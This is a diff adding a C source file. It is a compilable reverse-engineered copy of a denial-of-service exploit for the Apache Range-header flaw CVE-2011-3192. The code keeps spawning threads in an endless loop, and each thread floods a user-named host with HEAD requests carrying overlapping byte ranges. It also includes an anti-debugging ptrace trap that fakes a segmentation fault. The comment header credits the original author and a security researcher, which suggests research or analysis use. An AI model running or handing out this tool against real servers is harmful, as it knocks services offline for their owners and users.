@@ -1,0 +1,146 @@
+/*
+ * This is a reverse engineered version of the exploit for CVE-2011-3192 made
+ * by ev1lut10n (http://jayakonstruksi.com/backupintsec/rapache.tgz).
+ * Copyright 2011 Ramon de C Valle <rcvalle@redhat.com>
+ *
+ * Compile with the following command:
+ * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <pthread.h>
+
+void ptrace_trap(void) __attribute__ ((constructor));
+
+void
+ptrace_trap(void) {
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
+        write(fileno(stdout), "Segmentation fault\n", 19);
+        exit(-1);
+    }
+}
+
+void
+w4rn41dun14mu(int attr, int fg, int bg)
+{
+    char command[13];
+
+    sprintf(command, "%c[%d;%d;%dm", 0x1b, attr, fg+30, bg+40);
+    printf("%s", command);
+}
+
+void
+banner()
+{
+    w4rn41dun14mu(0, 1, 0);
+    fwrite("Remote Apache Denial of Service Exploit by ev1lut10n\n", 53, 1,
+           stdout);
+}
+
+void
+gime_er_mas()
+{
+    printf("%c%s", 0x1b, "[2J");
+    printf("%c%s", 0x1b, "[1;1H");
+    puts("\nsorry dude there's an error...");
+}
+
+struct thread_info {
+    pthread_t thread_id;
+    int       thread_num;
+    char     *argv_string;
+};
+
+static void *
+thread_start(void *arg)
+{
+    struct thread_info *tinfo = (struct thread_info *) arg;
+    char hostname[64];
+    int j;
+
+    strcpy(hostname, tinfo->argv_string);
+
+    j = 0;
+    while (j != 10) {
+        struct addrinfo hints;
+        struct addrinfo *result, *rp;
+        int sfd, s;
+        ssize_t nwritten;
+
+        memset(&hints, 0, sizeof(struct addrinfo));
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_flags = 0;
+        hints.ai_protocol = 0;
+
+        s = getaddrinfo(hostname, "http", &hints, &result);
+        if (s != 0) {
+            fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
+            exit(EXIT_FAILURE);
+        }
+
+        for (rp = result; rp != NULL; rp = rp->ai_next) {
+            sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
+            if (sfd == -1)
+                continue;
+
+            if (connect(sfd, rp->ai_addr, rp->ai_addrlen) == -1)
+                close(sfd);
+        }
+
+        if (result != NULL)
+            freeaddrinfo(result);
+
+        nwritten = write(sfd, "HEAD / HTTP/1.1\n"
+                              "Host:localhost\n"
+                              "Range:bytes=0-,0-\n"
+                              "Accept-Encoding: gzip", 71);
+        if (nwritten == -1)
+            close(sfd);
+
+        usleep(300000);
+
+        j++;
+    }
+
+    return 0;
+}
+
+int
+main(int argc, char *argv[])
+{
+    int i;
+    struct thread_info tinfo;
+
+    banner();
+
+    if (argc <= 1) {
+        w4rn41dun14mu(0, 2, 0);
+        fwrite("\n[-] Usage : ./rapache hostname\n", 32, 1, stdout);
+        return 0;
+    }
+
+    w4rn41dun14mu(0, 3, 0);
+    printf("[+] Attacking %s please wait  in minutes ...\n", argv[1]);
+
+    while (1) {
+        i = 0;
+        while (i != 50) {
+            tinfo.thread_num = i;
+            tinfo.argv_string = argv[1];
+
+            pthread_create(&tinfo.thread_id, NULL, &thread_start, &tinfo);
+
+            usleep(500000);
+
+            i++;
+        }
+    }
+}
